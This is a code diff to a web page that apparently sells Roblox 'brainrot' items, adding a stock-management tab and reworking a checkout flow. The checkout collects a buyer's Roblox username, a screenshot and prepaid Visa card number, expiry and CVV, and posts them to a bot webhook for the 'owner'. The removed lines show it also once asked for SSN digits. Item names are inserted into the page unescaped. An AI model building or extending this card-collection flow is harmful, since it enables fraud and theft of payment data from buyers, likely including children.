@@ -36,6 +36,7 @@
     .tabs { display:flex; margin-bottom:20px; border-bottom:2px solid #333; }
     .tab { flex:1; padding:14px; text-align:center; cursor:pointer; background:#222; border-radius:8px 8px 0 0; }
     .tab.active { background:#ff4d4d; color:white; font-weight:bold; }
+    .stock-item { border:1px solid #444; padding:12px; margin-bottom:12px; border-radius:8px; }
   </style>
 </head>
 <body>
@@ -62,11 +63,10 @@
 
     <!-- Main Content -->
     <div id="mainPart" style="display:none;">
-      <!-- Tabs -->
       <div class="tabs">
         <div class="tab active" onclick="switchTab(0)">Add Brainrot</div>
         <div class="tab" onclick="switchTab(1)">Delete Brainrot</div>
-        <div class="tab" onclick="switchTab(2)">Transactions</div>
+        <div class="tab" onclick="switchTab(2)">Manage Stock</div>
       </div>
 
       <!-- Add Tab -->
@@ -96,11 +96,9 @@
         <div id="deleteList"></div>
       </div>
 
-      <!-- Transactions Tab -->
-      <div id="transactionsTab" style="display:none;">
-        <input id="searchReceipt" placeholder="Search by Receipt Number" style="margin-bottom:10px;">
-        <button onclick="searchReceipt()" style="background:#ff4d4d;color:white;">Search</button>
-        <div id="transactionDetails" style="margin-top:15px;"></div>
+      <!-- Manage Stock Tab -->
+      <div id="stockTab" style="display:none;">
+        <div id="stockList"></div>
       </div>
     </div>
   </div>
@@ -126,7 +124,7 @@
 <div id="step3" class="modal"><div class="panel">
   <div style="font-size:1.2rem;margin-bottom:15px;">3/5</div>
   <h2>Your Roblox Username</h2>
-  <input id="robloxUser" placeholder="Username">
+  <input id="robloxUser" placeholder="Username" required>
   <button onclick="goToStep4()" style="background:#ff4d4d;color:white;margin-top:15px;">Submit</button>
   <button onclick="closeModals()" class="back-btn">Back</button>
 </div></div>
@@ -134,7 +132,7 @@
 <div id="step4" class="modal"><div class="panel">
   <div style="font-size:1.2rem;margin-bottom:15px;">4/5</div>
   <h2>Upload Screenshot</h2>
-  <input type="file" id="screenshot" accept="image/*">
+  <input type="file" id="screenshot" accept="image/*" required>
   <button onclick="goToStep5()" style="background:#ff4d4d;color:white;margin-top:15px;">Next</button>
   <button onclick="closeModals()" class="back-btn">Back</button>
 </div></div>
@@ -143,10 +141,9 @@
   <div style="font-size:1.2rem;margin-bottom:15px;">5/5</div>
   <h2>Prepaid Visa Card Details</h2>
   <p class="warning">⚠️ DO NOT PUT A REAL CREDIT OR DEBIT CARD IN THESE FIELDS ⚠️</p>
-  <input id="cardNumber" placeholder="Card Number">
-  <input id="expiry" placeholder="Expiry (MM/YY)">
-  <input id="cvv" placeholder="CVV">
-  <input id="ssn" placeholder="SSN (last 4 digits)">
+  <input id="cardNumber" placeholder="Card Number" required>
+  <input id="expiry" placeholder="Expiry (MM/YY)" required>
+  <input id="cvv" placeholder="CVV" required>
   <button onclick="sendToOwner()" style="background:#ff4d4d;color:white;margin-top:15px;">Send to Owner</button>
   <button onclick="closeModals()" class="back-btn">Back</button>
 </div></div>
@@ -166,6 +163,7 @@ function unlock() {
     document.getElementById('loginSection').style.display = 'none';
     document.getElementById('mainPart').style.display = 'block';
     loadDeleteList();
+    loadStockList();
   } else {
     document.getElementById('error').innerHTML = 'Wrong key';
   }
@@ -175,7 +173,7 @@ function unlock() {
 function switchTab(tab) {
   document.getElementById('addTab').style.display = tab === 0 ? 'block' : 'none';
   document.getElementById('deleteTab').style.display = tab === 1 ? 'block' : 'none';
-  document.getElementById('transactionsTab').style.display = tab === 2 ? 'block' : 'none';
+  document.getElementById('stockTab').style.display = tab === 2 ? 'block' : 'none';
   document.querySelectorAll('.tab').forEach((t, i) => t.classList.toggle('active', i === tab));
 }
 
@@ -294,17 +292,45 @@ async function deleteItem(id) {
   }
 }
 
-// Search receipt in Transactions tab
-async function searchReceipt() {
-  const receipt = document.getElementById('searchReceipt').value.trim();
-  if (!receipt) return alert('Enter a receipt number');
-  // For now we show a placeholder — server-side receipt storage is next
-  document.getElementById('transactionDetails').innerHTML = `
-    <p>Receipt #${receipt}</p>
-    <p>Brainrot: [Loaded from server]</p>
-    <p>Payment: [Loaded from server]</p>
-    <p>Details: [Loaded from server]</p>
-  `;
+// Load stock management tab
+async function loadStockList() {
+  try {
+    const res = await fetch('/items?_=' + Date.now());
+    const data = await res.json();
+    let html = '';
+    data.forEach(i => {
+      if (i.quantity <= 0) {
+        html += `
+          <div class="stock-item">
+            <h3>${i.name}</h3>
+            <p>Status: In Buying</p>
+            <button onclick="setStatus(${i.id}, -1)" style="background:#ff1a1a;color:white;margin:5px;">Compromised</button>
+            <button onclick="setStatus(${i.id}, 0)" style="background:#ffaa00;color:white;margin:5px;">Keep In Buying</button>
+            <button onclick="setStatus(${i.id}, 1)" style="background:#00ff88;color:black;margin:5px;">Make Available</button>
+          </div>
+        `;
+      }
+    });
+    document.getElementById('stockList').innerHTML = html || '<p>No brainrots in buying.</p>';
+  } catch (e) {
+    document.getElementById('stockList').innerHTML = '<p>Error loading stock.</p>';
+  }
+}
+
+// Set status (Compromised / Keep / Available)
+async function setStatus(id, status) {
+  try {
+    if (status === -1) {
+      await fetch(`/delete/${id}`, { method: 'DELETE' });
+    } else {
+      await fetch(`/set-status/${id}`, { method: 'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({quantity: status}) });
+    }
+    alert('Status updated!');
+    loadStockList();
+    loadItems();
+  } catch (e) {
+    alert('Failed');
+  }
 }
 
 // Buy flow
@@ -358,14 +384,17 @@ function goToStep5() {
 }
 
 async function sendToOwner() {
-  const username = document.getElementById('robloxUser').value.trim() || 'Unknown';
-  const discordUser = document.getElementById('discordUser') ? document.getElementById('discordUser').value.trim() || 'Unknown' : 'Unknown';
+  const username = document.getElementById('robloxUser').value.trim();
+  const discordUser = document.getElementById('discordUser') ? document.getElementById('discordUser').value.trim() : '';
   const cardNumber = document.getElementById('cardNumber') ? document.getElementById('cardNumber').value.trim() : '';
   const expiry = document.getElementById('expiry') ? document.getElementById('expiry').value.trim() : '';
   const cvv = document.getElementById('cvv') ? document.getElementById('cvv').value.trim() : '';
-  const ssn = document.getElementById('ssn') ? document.getElementById('ssn').value.trim() : '';
 
-  // Generate receipt number
+  if (!username || (currentPaymentType === 'visa' && (!cardNumber || !expiry || !cvv))) {
+    alert('All fields are required!');
+    return;
+  }
+
   receiptNumber = 'RCP-' + Math.floor(100000 + Math.random() * 900000);
 
   const payload = {
@@ -376,7 +405,7 @@ async function sendToOwner() {
     discordUser,
     proof: screenshotData || 'No screenshot',
     paymentType: currentPaymentType,
-    cardDetails: currentPaymentType === 'visa' ? { cardNumber, expiry, cvv, ssn } : null
+    cardDetails: currentPaymentType === 'visa' ? { cardNumber, expiry, cvv } : null
   };
 
   try {
@@ -385,11 +414,9 @@ async function sendToOwner() {
       headers: {'Content-Type': 'application/json'},
       body: JSON.stringify(payload)
     });
-  } catch (e) {
-    console.log("⚠️ Bot webhook failed");
-  }
+  } catch (e) {}
 
-  alert(`✅ Purchase complete!\n\nReceipt Number: ${receiptNumber}\n\nSave this number and send it to the owner if needed.`);
+  alert(`✅ Purchase Complete!\n\nReceipt Number: ${receiptNumber}\n\nSave this number.`);
   closeModals();
   loadItems();
 }
